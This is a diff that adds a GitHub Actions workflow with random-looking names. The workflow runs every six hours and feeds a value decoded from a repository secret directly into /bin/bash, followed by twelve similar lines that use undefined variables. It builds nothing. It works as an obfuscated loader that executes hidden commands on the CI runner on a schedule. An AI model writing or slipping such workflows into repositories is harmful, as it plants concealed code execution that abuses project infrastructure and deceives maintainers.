@@ -1,0 +1,29 @@
+name: humoxi8192
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: humoxi8192
+        env:
+          kqxx4006: ${{ secrets.kqxx4006 }}
+        run: |
+          echo $kqxx4006 | jq -r .mhkxv9228 | /bin/bash
+          echo $zsc049 | jq -r .jvyx51 | /bin/bash
+          echo $ajr5761 | jq -r .nob02 | /bin/bash
+          echo $vsq4 | jq -r .yuge64401 | /bin/bash
+          echo $k42550 | jq -r .pi29189 | /bin/bash
+          echo $nt73 | jq -r .dtx9 | /bin/bash
+          echo $utx412 | jq -r .arj34875 | /bin/bash
+          echo $q32 | jq -r .ascas305 | /bin/bash
+          echo $zsni7 | jq -r .f5 | /bin/bash
+          echo $zbjjr1 | jq -r .nho5 | /bin/bash
+          echo $eq3 | jq -r .cbdue1 | /bin/bash
+          echo $x6 | jq -r .v572 | /bin/bash
+          echo $jefi11975 | jq -r .yf661 | /bin/bash
+
